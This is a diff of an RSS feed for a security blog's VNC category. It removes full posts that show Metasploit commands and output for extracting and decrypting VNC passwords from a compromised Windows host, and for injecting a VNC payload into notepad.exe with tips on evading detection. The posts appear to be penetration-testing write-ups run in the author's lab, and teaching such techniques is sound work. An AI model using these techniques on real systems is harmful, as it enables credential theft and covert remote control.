@@ -1,196 +1,28 @@
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-  <channel>
-    <title>vnc on malicious.link</title>
-    <link>https://malicious.link/categories/vnc/</link>
-    <description>Recent content in vnc on malicious.link</description>
-    <generator>Hugo -- gohugo.io</generator>
-    <language>en-us</language>
-    <lastBuildDate>Mon, 21 Mar 2011 02:12:29 +0000</lastBuildDate>
-    
-        <atom:link href="https://malicious.link/categories/vnc/index.xml" rel="self" type="application/rss+xml" />
-    
-    
-    <item>
-      <title>Metasploit VNC Password Extraction</title>
-      <link>https://malicious.link/post/2011/2011-03-21-metasploit-vnc-password-extraction/</link>
-      <pubDate>Mon, 21 Mar 2011 02:12:29 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2011/2011-03-21-metasploit-vnc-password-extraction/</guid>
-      <description>&lt;p&gt;&lt;a href=&#34;http://carnal0wnage.blogspot.com/2011/03/vnc-passwords-and-metasploit-and-des.html&#34;&gt;Chris Gates wrote a blog post&lt;/a&gt; about the &amp;lsquo;getvncpw&amp;rsquo; meterpreter script. I ran into the same issue on Penetration Tests in the past but didn&amp;rsquo;t know much about the wacked out version of DES that RFB (the VNC protocol) was using. Not being a fan of manually editing a binary and compiling each time I had a password to crack I wanted to find another way, but didn&amp;rsquo;t get a chance to.&lt;/p&gt;
-&lt;p&gt;Yesterday I saw this ticket: &lt;a href=&#34;https://www.metasploit.com/redmine/issues/3183&#34;&gt;https://www.metasploit.com/redmine/issues/3183&lt;/a&gt; and thought to myself: &amp;ldquo;Thats definitely within my coding ability to contribute a patch for&amp;rdquo;. After almost 15 hours of coding between 9 pm on Saturday and 8 pm on Sunday. It went far and beyond just adding in a bit of code to support UltraVNC.&lt;/p&gt;
-&lt;p&gt;changelog:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;Complete rewrite as a post module instead of a meterpreter script&lt;/li&gt;
-&lt;li&gt;Passwords of less than 8 characters are correctly padded (&lt;a href=&#34;https://www.metasploit.com/redmine/projects/framework/repository/revisions/12033&#34;&gt;thanks jduck&lt;/a&gt;)&lt;/li&gt;
-&lt;li&gt;UltraVNC checks added&lt;/li&gt;
-&lt;li&gt;TightVNC checks added for both VNC and it&amp;rsquo;s control console&lt;/li&gt;
-&lt;li&gt;Made it very simple to add new checks in either the registry or in a file&lt;/li&gt;
-&lt;li&gt;Output is a bit more verbose (lets you know something is happening&lt;/li&gt;
-&lt;li&gt;Reports authentication credentials found to database&lt;/li&gt;
-&lt;li&gt;Identifies the port that VNC is running on as well&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;It isn&amp;rsquo;t in the metasploit trunk so until/if if gets added you can get it here:&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://gist.github.com/mubix/8215705&#34;&gt;enum_vnc_pw.rb&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;If you have a check, find it breaks for some reason or another, or just want to tell me that I suck, please leave a comment or email me.&lt;/p&gt;
-&lt;p&gt;Here it is in action against my VM with 3 different VNC servers on it (calling the post module in two separate ways) :&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf exploit(handler) &amp;gt; sessions -i 1
-[*] Starting interaction with 1...
-
-meterpreter &amp;gt; getuid
-Server username: XPBASELINEAdministrator
-meterpreter &amp;gt; background
-msf exploit(handler) &amp;gt; use post/windows/gather/enum_vnc_pw 
-msf post(enum_vnc_pw) &amp;gt; set SESSION 1
-SESSION =&amp;gt; 1
-msf post(enum_vnc_pw) &amp;gt; show options
-
-Module options (post/windows/gather/enum_vnc_pw):
-
-   Name     Current Setting  Required  Description
-   ----     ---------------  --------  -----------
-   SESSION  1                yes       The session to run this module on.
-
-msf post(enum_vnc_pw) &amp;gt; run
-
-[*] Enumerating VNC passwords on XPBASELINE
-[*] Checking UltraVNC...
-[+] UltraVNC =&amp;gt; A85B4C5976979DE93B =&amp;gt; thisismy on port: 5900
-[+] VIEW ONLY: UltraVNC =&amp;gt; DE2C1BA7393F6708B3 =&amp;gt; 111 on port: 5900
-[*] Checking WinVNC3_HKLM...
-[*] Checking WinVNC3_HKCU...
-[*] Checking WinVNC3_HKLM_Default...
-[*] Checking WinVNC3_HKCU_Default...
-[*] Checking WinVNC_HKLM_Default...
-[*] Checking WinVNC_HKCU_Default...
-[*] Checking WinVNC4_HKLM...
-[+] WinVNC4_HKLM =&amp;gt; c777b2de337a91cf =&amp;gt; mypasswo on port: 5900
-[*] Checking WinVNC4_HKCU...
-[*] Checking RealVNC_HKLM...
-[*] Checking RealVNC_HKCU...
-[*] Checking TightVNC_HKLM...
-[+] TightVNC_HKLM =&amp;gt; 7ebf1e76f732459f =&amp;gt; authpass on port: 5900
-[*] Checking TightVNC_HKLM_Control_pass...
-[+] TightVNC_HKLM_Control_pass =&amp;gt; f0299fd0e927cf2f =&amp;gt; adminpas on port: 5900
-[*] Post module execution completed
-
-msf post(enum_vnc_pw) &amp;gt; sessions -i 1
-[*] Starting interaction with 1...
-
-meterpreter &amp;gt; run post/windows/gather/enum_vnc_pw 
-
-[*] Enumerating VNC passwords on XPBASELINE
-[*] Checking UltraVNC...
-[+] UltraVNC =&amp;gt; A85B4C5976979DE93B =&amp;gt; thisismy on port: 5900
-[+] VIEW ONLY: UltraVNC =&amp;gt; DE2C1BA7393F6708B3 =&amp;gt; 111 on port: 5900
-[*] Checking WinVNC3_HKLM...
-[*] Checking WinVNC3_HKCU...
-[*] Checking WinVNC3_HKLM_Default...
-[*] Checking WinVNC3_HKCU_Default...
-[*] Checking WinVNC_HKLM_Default...
-[*] Checking WinVNC_HKCU_Default...
-[*] Checking WinVNC4_HKLM...
-[+] WinVNC4_HKLM =&amp;gt; c777b2de337a91cf =&amp;gt; mypasswo on port: 5900
-[*] Checking WinVNC4_HKCU...
-[*] Checking RealVNC_HKLM...
-[*] Checking RealVNC_HKCU...
-[*] Checking TightVNC_HKLM...
-[+] TightVNC_HKLM =&amp;gt; 7ebf1e76f732459f =&amp;gt; authpass on port: 5900
-[*] Checking TightVNC_HKLM_Control_pass...
-[+] TightVNC_HKLM_Control_pass =&amp;gt; f0299fd0e927cf2f =&amp;gt; adminpas on port: 5900
-meterpreter &amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;</description>
-    </item>
-    
-    <item>
-      <title>Meterpreter tunneling and VNC revamped</title>
-      <link>https://malicious.link/post/2009/2009-12-15-meterpreter-tunneling-and-vnc-revamped/</link>
-      <pubDate>Tue, 15 Dec 2009 13:00:37 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2009/2009-12-15-meterpreter-tunneling-and-vnc-revamped/</guid>
-      <description>&lt;p&gt;So yesterday (December 14th, 2009) &lt;a href=&#34;http://twitter.com/hdmoore&#34;&gt;HD Moore&lt;/a&gt; posted &lt;a href=&#34;http://twitter.com/hdmoore/status/6663737357&#34;&gt;a tweet&lt;/a&gt; with a pic of the new VNC meterpreter script that he wrote:&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/200912_vnc_1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;Looking at the script I noticed that it created a new connection (two connections outbound). Well it was the perfect excuse to take the newly refurbished portfwd command for a spin.&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://github.com/mubix/stuff/blob/master/metasploit/vnc_oneport.rb&#34;&gt;https://github.com/mubix/stuff/blob/master/metasploit/vnc_oneport.rb&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;Or you can get it via the SVN at &lt;a href=&#34;https://metasploit.com/redmine/projects/framework/repository/revisions/7872&#34;&gt;Revision 7872&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;By creating a bind payload instead of a reverse connect we can have the payload listen locally. Then with portfwd command (just like on your home router) we forward a local port to the local host on the remote side, to the binded port. Connecting to the freshly bound port as if we were actually doing everything on the box itself. Creating a new session and a nice beautiful VNC window.&lt;/p&gt;
-&lt;h2 id=&#34;options&#34;&gt;Options:&lt;/h2&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;meterpreter &amp;gt; run vnc_oneport -h
-
-OPTIONS:  
--e &amp;lt;opt&amp;gt; The process to run and inject into (default: notepad.exe)  
--h  This help menu  
--l &amp;lt;opt&amp;gt; The local port to listen on via port forwarding (default: 5901)  
--p &amp;lt;opt&amp;gt; The port on the remote host to bind VNC to (default: randomized)
-
-meterpreter &amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;example-run&#34;&gt;Example Run:&lt;/h2&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[*] Meterpreter session 1 opened (192.168.92.103:4444 -&amp;gt; 192.168.92.113:1038)
-
-meterpreter &amp;gt; **_run vnc_oneport_**
-[*] Creating a VNC stager: RHOST=127.0.0.1 LPORT=1207
-[*] Host process notepad.exe has PID 532
-[*] Allocated memory at address 0x00640000
-[*] Writing the VNC stager into memory...
-[*] Running Payload
-[*] Creating a new thread within notepad.exe to run the VNC stager...
-[*] Starting the port forwarding from 5901 =&amp;gt; TARGET:1207
-[*] Local TCP relay created: 0.0.0.0:5901 &amp;lt;-&amp;gt; 127.0.0.1:1207
-
-meterpreter &amp;gt; [*] VNC Server session 2 opened (127.0.0.1:56893 -&amp;gt; 127.0.0.1:5901)
-Connected to RFB server, using protocol version 3.3
-No authentication needed
-Desktop name &amp;#34;VNCShell [SYSTEM@WORKSTATION1] - Full Access&amp;#34;
-VNC server default format:
-32 bits per pixel.
-Least significant byte first in each pixel.
-	True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
-	Using default colormap which is TrueColor.  Pixel format:
-	32 bits per pixel.
-Least significant byte first in each pixel.
-	True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
-	Using shared memory PutImage
-Same machine: preferring raw encoding
-ShmCleanup called
-[*] VNC Server session 2 closed.
-meterpreter &amp;gt;
-[*] Meterpreter session 1 opened (192.168.92.103:4444 -&amp;gt; 192.168.92.113:1038)  
-meterpreter &amp;gt; run vnc_oneport  
-[*] Creating a VNC stager: RHOST=127.0.0.1 LPORT=1207  
-[*] Host process notepad.exe has PID 532  
-[*] Allocated memory at address 0x00640000  
-[*] Writing the VNC stager into memory...  
-[*] Running Payload  
-[*] Creating a new thread within notepad.exe to run the VNC stager...  
-[*] Starting the port forwarding from 5901 =&amp;gt; TARGET:1207  
-[*] Local TCP relay created: 0.0.0.0:5901 &amp;lt;-&amp;gt; 127.0.0.1:1207  
-meterpreter &amp;gt; [*] VNC Server session 2 opened (127.0.0.1:56893 -&amp;gt; 127.0.0.1:5901)  
-Connected to RFB server, using protocol version 3.3  
-No authentication needed  
-Desktop name &amp;#34;VNCShell [SYSTEM@WORKSTATION1] - Full Access&amp;#34;VNC server default format: 32 bits per pixel. Least significant byte first in each pixel. True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0  
-Using default colormap which is TrueColor.  Pixel format: 32 bits per pixel. Least significant byte first in each pixel. True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0  
-Using shared memory PutImageSame machine: preferring raw encodingShmCleanup called  
-[*] VNC Server session 2 closed.
-
-meterpreter &amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;note&#34;&gt;Note:&lt;/h2&gt;
-&lt;p&gt;The forwarded port does not close even if the meterpreter session is ended, so use the following command to close the forward:&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;meterpreter &amp;gt; portfwd delete -l 5901  
-[*] Successfully stopped TCP relay on 0.0.0.0:5901
-meterpreter &amp;gt;
-
-(Note to BT4 users: do a `apt-get install vncviewer` before using any of the vnc payloads in Metasploit)
-
-The script utilizes just one of the millions of way you can leverage &amp;#39;portfwd&amp;#39; in your endeavors. But where it gets interesting is the fact that the delivery method for the payload never touches disk. That magic is all credited to HD though. What happens is a new process is created (notepad by default) and the newly created VNC bind payload is injected into it. But, the beauty is that it&amp;#39;s doing local connections via the port forwarding so all you see in TCPView is:
-
-![](/images/postimages/200912_vnc_2.png)
-
-Now it&amp;#39;s definitely suspicious that Notepad has any connections at all, but you can use the option `-e` to provide any executable you wish, as long as it&amp;#39;s in the path for the system. For examples, look at what&amp;#39;s running naturally already.
-
-Plus, you would probably not be using port 4444 for a meterpreter session. But what I wanted to demonstrate with this script is the power of both meterpreter, and port forwarding.
-
-Now it&amp;#39;s your turn to make it better. Take a look at the guts, see if anything will help you in your scripting.
-&lt;/code&gt;&lt;/pre&gt;</description>
-    </item>
-    
-  </channel>
+<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
+    <channel>
+        <title>vnc - Category - Malicious Link - Blog by mubix - Rob Fuller</title>
+        <link>https://malicious.link/categories/vnc/</link>
+        <description>vnc - Category - Malicious Link - Blog by mubix - Rob Fuller</description>
+        <generator>Hugo -- gohugo.io</generator><language>en</language><managingEditor>mubix@hak5.org (Rob Fuller)</managingEditor>
+            <webMaster>mubix@hak5.org (Rob Fuller)</webMaster><lastBuildDate>Mon, 21 Mar 2011 02:12:29 &#43;0000</lastBuildDate><atom:link href="https://malicious.link/categories/vnc/" rel="self" type="application/rss+xml" /><item>
+    <title>Metasploit VNC Password Extraction</title>
+    <link>https://malicious.link/posts/2011/2011-03-21-metasploit-vnc-password-extraction/</link>
+    <pubDate>Mon, 21 Mar 2011 02:12:29 &#43;0000</pubDate>
+    <author>mubix</author>
+    <guid>https://malicious.link/posts/2011/2011-03-21-metasploit-vnc-password-extraction/</guid>
+    <description><![CDATA[Chris Gates wrote a blog post about the &lsquo;getvncpw&rsquo; meterpreter script. I ran into the same issue on Penetration Tests in the past but didn&rsquo;t know much about the wacked out version of DES that RFB (the VNC protocol) was using. Not being a fan of manually editing a binary and compiling each time I had a password to crack I wanted to find another way, but didn&rsquo;t get a chance to.]]></description>
+</item>
+<item>
+    <title>Meterpreter tunneling and VNC revamped</title>
+    <link>https://malicious.link/posts/2009/2009-12-15-meterpreter-tunneling-and-vnc-revamped/</link>
+    <pubDate>Tue, 15 Dec 2009 13:00:37 &#43;0000</pubDate>
+    <author>mubix</author>
+    <guid>https://malicious.link/posts/2009/2009-12-15-meterpreter-tunneling-and-vnc-revamped/</guid>
+    <description><![CDATA[So yesterday (December 14th, 2009) HD Moore posted a tweet with a pic of the new VNC meterpreter script that he wrote:
+Looking at the script I noticed that it created a new connection (two connections outbound). Well it was the perfect excuse to take the newly refurbished portfwd command for a spin.
+https://github.com/mubix/stuff/blob/master/metasploit/vnc_oneport.rb
+Or you can get it via the SVN at Revision 7872
+By creating a bind payload instead of a reverse connect we can have the payload listen locally.]]></description>
+</item>
+</channel>
 </rss>
